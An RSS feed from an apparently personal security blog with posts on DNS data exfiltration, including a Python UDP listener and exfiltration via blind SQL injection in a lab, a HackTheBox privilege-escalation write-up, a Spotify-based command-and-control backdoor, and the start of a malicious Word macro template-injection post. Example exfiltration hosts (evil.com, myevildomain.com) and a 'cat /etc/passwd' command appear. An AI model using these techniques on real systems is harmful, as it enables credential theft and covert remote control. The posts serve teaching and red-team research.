<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>John Woodman's Security Blog</title>
    <description>I'm a security enthusiast looking for new ways to break stuff and stay hidden while doing it. All content posted here is for educational and research purposes only. </description>
    <link></link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <author>
      <name>John Woodman</name>
      <email>john.woodman11@gmail.com</email>
      <uri>https://google.com/</uri>
    </author>
    
      <item>
        <title>Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)</title>
        <description>&lt;p&gt;Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it’s as simple as scp’ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server? Or has a whitelist of allowed sites and yours isn’t on it (obviously)? Another method is still possible: DNS.&lt;/p&gt;

&lt;p&gt;In this post, I’ll be showing how I set up a public malicious (depending on how you use it) DNS server for exfiltrating data without actually having to run a DNS server ;).&lt;/p&gt;

&lt;h2 id=&quot;what-is-dns-exfiltration&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;What Is DNS Exfiltration?&lt;/h2&gt;

&lt;p&gt;The general idea of DNS exfiltration isn’t unsimilar to exfiltrating data through HTTP web requests. Sensitive data is attached to a DNS query that can then be viewed by our malicious DNS server. In this case, the sensitive data is prepended onto the subdomain of our controlled public domain. For example, if we were able to access the password of a user on a victim’s machine, in order to exfil that data, we would have the victim machine make a DNS request for password123.myevildomain.com, with the “password123” being the victim’s password. Since own myevildomain.com, the request to resolve password123 would come to my server. The best part is, I don’t even have to actually respond to the request since I’ve already got what I came for.&lt;/p&gt;

&lt;h2 id=&quot;what-youll-need&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;What You’ll Need&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Public Server you control (I used a digital ocean server)&lt;/li&gt;
  &lt;li&gt;Public domain name linked to that server&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;setting-up-the-pulbic-domain&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Setting Up The Pulbic Domain&lt;/h2&gt;

&lt;p&gt;The first thing you need is a publicly registered domain. You can do this on a number of sites, but I used godaddy to register john-woodman.com and pointed it to my digitalocean server.&lt;/p&gt;

&lt;h3 id=&quot;creating-a-hostname-for-our-nameserver&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Creating A Hostname For Our Nameserver&lt;/h3&gt;
&lt;p&gt;Once I registered the domain, I then added my own hostname as a nameserver through godaddy. The reason I had to do this is because nameserver records can’t specify an IP address, it must be a hostname. I made the hostname for the nameserver ns.john-woodman.com and pointed it to my digitalocean server IP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/1.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;setting-nameservers-to-digitaloceans&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Setting Nameservers To DigitalOcean’s&lt;/h3&gt;
&lt;p&gt;DigitalOcean actually has the ability to manage DNS records for you. While I could do everything on godaddy or whichever name resolution service you chose, I found DigitalOcean has a nice, simple interface. In godaddy, I set the custom nameservers to DigitalOcean’s so that any DNS requests made to john-woodman.com would go to DigitalOcean.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/2.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have that setup, we can do everything else on DigitalOcean.&lt;/p&gt;

&lt;h3 id=&quot;redirecting-subdomain-requests&quot;&gt;&lt;a href=&quot;#header-6&quot;&gt;&lt;/a&gt;Redirecting Subdomain Requests&lt;/h3&gt;
&lt;p&gt;I now have to create a few DNS records so that any requests to a specific subdomain will be redirected to my DNS Server instead of being handled by DigitalOcean’s. I first have to create an A record that points all requests to john-woodman.com to my IP (this is mostly to keep my website up and running). I then have to create an A record that points the nameserver domain (ns.john-woodman.com) to my server’s IP. Now, unfortunately, with NS records, I’m not able to specify a wildcard in the subdomain (such as &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;.john-woodman.com). From what I can gather, it seems to just not be supported by DNS, with no reason why. Either way, we can get around this by actually just specifying any name for the subdomain, and all subdomain requests sent to that subdomain (subception) will be directed to our DNS server. In my case, I chose a completely random subdomain steve.john-woodman.com. You can call it whatever you want (probably best not to have special characters just to be safe). So when im exfiltrating data, the DNS request would look like for example: password123.steve.john-woodman.com. This is what my DNS configuration looks like on DigitalOcean.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/3.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-listener&quot;&gt;&lt;a href=&quot;#header-7&quot;&gt;&lt;/a&gt;Setting Up The Listener&lt;/h2&gt;
&lt;p&gt;The nice part is we don’t actually have to run any DNS service on our server. We can just set up a simple python listener, sift through the data we recieve and grab what we need. Below is the code I wrote to listen on UDP port 53 (DNS requests come in on UDP for the most part).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;dnslib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNSRecord&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvfrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNSRecord&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;questions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_qname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;testing-and-exploiting&quot;&gt;&lt;a href=&quot;#header-8&quot;&gt;&lt;/a&gt;Testing and Exploiting&lt;/h2&gt;
&lt;p&gt;To make sure that it works, I can run a simple nslookup and see if my listener picks up the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/4.png&quot; alt=&quot;&quot; height=&quot;80%&quot; width=&quot;80%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The nslookup failed, but thats expected since for one, we don’t actually have any DNS service running, and second, the requested subdomain doesn’t exist. But as you can see, our server did recieve the request and, most importantly, we can see the subdomain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/5.png&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploiting&quot;&gt;&lt;a href=&quot;#header-9&quot;&gt;&lt;/a&gt;Exploiting&lt;/h2&gt;
&lt;p&gt;To really fully test our setup, I created a simple vulnerable webserver with a login page connected to a PostgreSQL database that contains login credentials. The webserver is vulnerable to SQL injection, but no output is returned to the user. There’s a few different methods I could use (time-based for example), but why not use DNS exfiltration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/6.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I won’t go into the exploit itself, but you can read about it &lt;a href=&quot;https://portswigger.net/web-security/sql-injection/blind&quot;&gt;here&lt;/a&gt;. Using Burp, I sent the URL encoded exploit that retrieved the password from the SQL table and sent it as the subdomain in the DNS request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/7.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the listener running on our server, we recieved the DNS request and can see the password that was stored in the PostgreSQL database set as the subdomain!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/8.png&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#header-10&quot;&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The inspiration for this project was trying to run my own server for DNS exfiltration instead of having to pay for the pro version of BurpSuite, which has a BurpCollaborator that will do this for you. I learned a lot more about DNS through this project, and I hope I was able to help you learn something too!&lt;/p&gt;
</description>
        <pubDate>Wed, 10 Jun 2020 00:00:00 +0000</pubDate>
        <link>//posts/DNS-Exfiltration-Setup/</link>
        <link href="/posts/DNS-Exfiltration-Setup/"/>
        <guid isPermaLink="true">/posts/DNS-Exfiltration-Setup/</guid>
      </item>
    
      <item>
        <title>HackTheBox&amp;#58; Writeup</title>
        <description>&lt;h3 id=&quot;box-type-linux&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Box Type: Linux&lt;/h3&gt;
&lt;h2 id=&quot;getting-user&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Getting User&lt;/h2&gt;
&lt;p&gt;Nmap scan showed ports 22 and 80 open.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture.PNG&quot; alt=&quot;&quot; height=&quot;65%&quot; width=&quot;65%&quot; style=&quot;display: block; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Checking out the website shows a notification that some sort of DoS protection is running on the webserver, likely preventing any dictionary or brute force attacks, which means no dirb :(.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture2.PNG&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Nmap scan did show a robots.txt, however:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture3.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%px&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Navigating to /writeup shows a home page with writeups for other retired boxes:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture4.PNG&quot; alt=&quot;&quot; height=&quot;90%&quot; width=&quot;90%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using wappalyzer, it showed that this webpage was running “CMS Made Simple”. Wappalyzer is a useful extension (available for chrome and firefox) which shows what various services, languages, operating system the current website is running.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture5.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A bit of googling on “CMS Made Simple” showed an &lt;a href=&quot;https://www.exploit-db.com/exploits/46635&quot;&gt;SQL Injection vulnerability&lt;/a&gt;, specifically a blind, time-based injection. Essentially what this means is that we don’t recieve any direct output from the injection (blind), so we have to use sleep functionality (time-based) in SQL along with the substring function to determine the trueness of each guess. Through this, we are able to determine valuable information stored on the machine’s database, including the Password hash, the salt for the password, the username, and the email related to that user. With this, we can crack the hash using either hashcat or johntheripper and a common wordlist (rockyou.txt), but luckily the exploit found on exploitdb does this all for us. All we have to do is specify the url (http://10.10.10.138/writeup) and the wordlist to use.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture6.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We now have the username and password for the user “jkr”. We can SSH in and get the user.txt flag.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture7.PNG&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;getting-root&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Getting Root&lt;/h2&gt;

&lt;p&gt;A common script I like to run on any linux box is “pspy”, which shows processes and commands being run in real time. This is useful to see if anything weird is being triggered by doing certain tasks. I used scp to transfer the pspy script over and ran it in one tab. I then opened another SSH connection in another tab to start hopefully triggering some events. Luckily, it was quite easy to find the right event to trigger, since actually SSHing into the box triggered some interesting commands.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture8.PNG&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s running a command called “run-parts” but it’s specifying it’s own $PATH environment variable. Well let’s check what groups our user is in and what permissions it has on some of these paths:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture9.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see we are in the “staff” group and staff has write permissions on “/usr/local/sbin”, which is the first path specified in the $PATH variable that we saw. Because of this, we can create our own “run-parts” file, have it do whatever we want, place it in /usr/local/sbin and our file will be executed instead of the expected one. This is because Unix will go down the list of the $PATH environment variable until it hits a match. This is what my “run-parts” file looks like:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture12.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Through a little troubleshooting of my own, I was able to figure out that the /root directory didn’t have a .ssh directory, which is why I had it make one in my run-parts file. I then copied by public SSH key over into the root’s authorized_keys file and bam, I can now SSH in as root:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture11.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Overall, this is a really good beginner box, as it points out some common web attacks and enumerations (checking robots.txt and SQL Injection). The priv esc was also a good starter as it points out a simple, yet common vulnerability, which is allowing paths in $PATH to be writable by unauthorized users.&lt;/p&gt;

&lt;p&gt;Hope you enjoyed and learned something :)&lt;/p&gt;
</description>
        <pubDate>Sat, 23 May 2020 00:00:00 +0000</pubDate>
        <link>//posts/HTB-Writeup/</link>
        <link href="/posts/HTB-Writeup/"/>
        <guid isPermaLink="true">/posts/HTB-Writeup/</guid>
      </item>
    
      <item>
        <title>CTF Writeup</title>
        <description>&lt;p&gt;This is a CTF Writeup&lt;/p&gt;
</description>
        <pubDate>Sat, 23 May 2020 00:00:00 +0000</pubDate>
        <link>//posts/CTF-XSS/</link>
        <link href="/posts/CTF-XSS/"/>
        <guid isPermaLink="true">/posts/CTF-XSS/</guid>
      </item>
    
      <item>
        <title>The Most Fun (and maybe impractical) Command and Control: SpotifyC2</title>
        <description>&lt;p&gt;Command and Control is one of the most common techniques used by attackers to maintain persistent control over an infected computer, sending commands to be executed and receiving the output of those commands. There exists many different methods for implementing Command and Control, from using cloud services (AWS, Azure, etc.) to even using social media to send commands. One method we will be exploring is one I haven’t seen before (probably for a good reason): using Spotify to send commands and receive output.&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;

&lt;p&gt;My good friend Terry Thibault (&lt;a href=&quot;https://twitter.com/defnotprobro&quot;&gt;@defnotprobro&lt;/a&gt;) inspired this project, where he presented a talk at BSides Orlando, leveraging Twitter as a method for Command and Control.&lt;/p&gt;

&lt;p&gt;Command and Control essentially functions through a backdoor running on the infected machine, beaconing out every once in a while to retrieve a command or a set of commands to be executed. Commands sent to the beacon are usually encoded or hidden in some way (base64, hidden in an image, etc.) to make it harder for someone to detect. My method uses acrostics in Spotify playlist tracks to send commands, and retrieves output through the description box available in those playlists.&lt;/p&gt;

&lt;p&gt;I developed multiple scripts to form a proof-of-concept:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/JohnWoodman/SpotifyC2&quot;&gt;SpotifyC2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I use Spotify’s API for creating and editing the playlists. If you’d like to use SpotifyC2 yourself, you’ll need to place your own client ID, secret, and refresh token in the scripts.&lt;/p&gt;

&lt;h2 id=&quot;breakdown&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Breakdown&lt;/h2&gt;

&lt;p&gt;Below is a breakdown of the Command and Control process using SpotifyC2.&lt;/p&gt;

&lt;h3 id=&quot;generating--sending-the-acrostic-command&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Generating &amp;amp; Sending The Acrostic Command&lt;/h3&gt;

&lt;p&gt;The command that the attacker wants to send to the infected machine is first checked for special and numeric characters and replaced with ascii characters, since most Spotify songs don’t start with a special character or a number. The replacement method I used was fairly simple: SPACE character was ‘space’, / was ‘fslash’, \ was ‘bslash’ and so on. Once the command is written in all ascii characters, an acrostic is generated based of a list of Spotify songs organized by genre (credit to &lt;a href=&quot;https://github.com/plamere/enspex/tree/master/web/Acrostify&quot;&gt;Acrostify&lt;/a&gt; for the database of songs). Using my PoC, you can select which genre of music to generate the acrostic from, cause why not :).&lt;/p&gt;

&lt;p&gt;The acrostic generated is also randomized, so repeating characters will not have repeating songs. Once the acrostic is generated, a playlist is created with a name of your choice. For my PoC, the name of the playlist does not matter, but it could be used to organize commands, or even correspond to times at which the command should be run on the infected machine (might add that feature later). The playlist will contain all the songs from the acrostic. However, an issue I ran into was certain genres of the song database wouldn’t generate the exact acrostic correctly, occasionally adding or replacing characters that shouldn’t be there. I didn’t test this on all genres (jazz and country were the ones I noticed the issue with), but the rock genre never gave me any issues, so I’d reccommend that until I figure out what the issue is.&lt;/p&gt;

&lt;p&gt;Below shows a playlist created from the command “cat /etc/passwd”. You can see the beginning of the command hidden in the acrostic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2019-12-22-SpotifyC2/1.png&quot; alt=&quot;&quot; height=&quot;435px&quot; width=&quot;666px&quot; style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the playlist is created, the playlist ID and command is placed in a file (playlist_id_list.txt) on your local machine, which is to be used later when retrieving the output from the infected machine.&lt;/p&gt;

&lt;p&gt;In my PoC, the script that does all this is &lt;a href=&quot;https://github.com/JohnWoodman/SpotifyC2/blob/master/genAcrostic.py&quot;&gt;genAcrostic.py&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-backdoor&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;The Backdoor&lt;/h3&gt;

&lt;p&gt;This part describes everything that the infected machine is doing to receive and execute the command as well as send back the command output. The backdoor beacons out periodically (the less freqeunt, the more stealhty), making a request to the Spotify API to list all of its current playlists. Each playlist contains a command, hidden in an acrostic built from the songs in the playlist. The backdoor gets the first letter of each song, decodes the special characters and numbers as needed, and formulates a command to be executed.&lt;/p&gt;

&lt;p&gt;Initially, I was going to have the output of the command encoded in an acrostic just as I did when sending the command, but I realized that there were a lot more special characters and keys, which would make the acrostic overly and unnecessarily complex. While looking through the Spotify app to see if there were any other ways, I noticed that each playlist has a description box. I decided that it made much more sense to send the base64 encoded output through there.&lt;/p&gt;

&lt;p&gt;However, the description box has a size limit of 300 characters, too short for the majority of the base64 encoded output. A fix I came up with was to split the base64 encoded output into 300 character pieces, placing the first piece in the description of the original command’s playlist. The subsequent 300 character pieces are then placed into newly created playlists until the entire output is used. In order for the attacker machine to re-assemble the base64 encoded output, the name of each of the newly created playlists are based off the playlist ID of original command’s playlist, with an incrementing number added to the end.&lt;/p&gt;

&lt;p&gt;Below shows a playlist created by the backdoor. A piece of the base64 encoded output is embedded in the description, and the name of the playlist reflects the playlist ID of the original command acrsotic, with an incrementing number added as the suffix (the image shows the 29th playlist created for this output). On the left are the list of the other playlists created, each containing a piece of the output to be re-assembled and decoded:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2019-12-22-SpotifyC2/2.png&quot; alt=&quot;&quot; height=&quot;354px&quot; width=&quot;671px&quot; style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In my Poc, the script that does all this is &lt;a href=&quot;https://github.com/JohnWoodman/SpotifyC2/blob/master/backdoor.py&quot;&gt;backdoor.py&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;retrieving-output&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Retrieving Output&lt;/h3&gt;

&lt;p&gt;Retrieving the output from the command is fairly straight forward. A request is made to the Spotify API to retrieve a list of all the playlists, which now contain the newly created ones from the backdoor. The description is retrieved from each of the playlists, and based off the incrementing number at the end of each playlist ID, the base64 encoded text is re-assembled in the proper order, and is then decoded to output of the command. Since multiple commands can be sent to the backdoor, in order to correspond an output to a specific command, the file “playlist_id_list.txt” is used to relate a playlist ID with its command. Once all the command outputs are retrieved and decoded, the “playlist_id_list.txt” file is deleted, as well as the Spotify playlists themselves.&lt;/p&gt;

&lt;p&gt;As shown below, once this process is complete, the playlists associated with the command and its output is deleted:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2019-12-22-SpotifyC2/3.png&quot; alt=&quot;&quot; height=&quot;348px&quot; width=&quot;533px&quot; style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In my PoC, the script that does all this is &lt;a href=&quot;https://github.com/JohnWoodman/SpotifyC2/blob/master/getOutput.py&quot;&gt;getOutput.py&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#header-6&quot;&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This method of Command and Control actually works quite well compared with other forms of social media C2. Commands are hidden in a unique way that may not be easily detected, and considering the vast number of playlists existing in Spotify, finding the C2 playlists would be quite a challenge for anyone looking for them. Some drawbacks to this method is the fact that Spotify never actually deletes a playlist, it technically only unfollows it. This isn’t a huge issue, as finding the playlist after unfollowing it is extremely difficult, but it should be known that it isn’t impossible. I suppose the main drawback is the fact that it probably makes more sense to use the other methods of C2 as they are likely more reliable and more private, such as gmail or Direct Messaging in other social media platforms. However, SpotifyC2 provides its own fun and unique ways of keeping commands hidden.&lt;/p&gt;

&lt;p&gt;I started this project firstly to learn more about Command and Control and the various methods used, and secondly to prove that this method could be done and that Spotify is a viable option for Command and Control, and I think I’ve done just that. While it isn’t the most practical, it certainly holds its own amongst the other unique methods of C2. Not to mention, its a lot of fun to think you can control someone’s computer by sending We Will Rock You.&lt;/p&gt;

</description>
        <pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate>
        <link>//posts/SpotifyC2/</link>
        <link href="/posts/SpotifyC2/"/>
        <guid isPermaLink="true">/posts/SpotifyC2/</guid>
      </item>
    
      <item>
        <title>VBA Macro Remote Template Injection With Unlinking &amp; Self-Deletion</title>
        <description>&lt;p&gt;One of the most common methods leveraged by attackers is the use of Malicious Word/Excel Documents sent over email. These malicious docs are embedded with macro VBA code that, when run, execute various tasks on the victim’s computer, usually resulting in RCE (Remote Code Execution) and/or data exfiltration.&lt;/p&gt;

&lt;p&gt;There are numerous techniques used on these malicious docs to bypass anti-virus detection (VBAStomping, obfuscation, etc.). One such method is Remote Template Injection.&lt;/p&gt;

&lt;h2 id=&quot;remote-template-injection&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Remote Template Injection&lt;/h2&gt;

&lt;p&gt;Word/Excel docs are made up of a collection of XML files all zipped together. You can actually unzip these docs by renaming the extension to .zip and extracting the contents as you would any zipped file. The XML file that we’re most interested in is settings.xml.rels located in the folder word_rels. However, if you unzipped just any document and looked for this file, it is likely that it won’t exist.&lt;/p&gt;

&lt;p&gt;This is because settings.xml.rels exists only for documents that were created from a template. This isn’t a huge issue, just make sure when you create the document, that it’s based off a pre-made template (you can choose any of the default templates Microsoft already provides). While the rest of this post should still apply to both Word and Excel documents, I will be referring specifically to Word documents for the remainder of the post, as I have not tested all of this on Excel.&lt;/p&gt;

&lt;p&gt;Below shows the contents of settings.xml.rels that you would typically find with most documents:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;?xml version=”1.0&quot; encoding=”UTF-8&quot; standalone=”yes”?&gt;
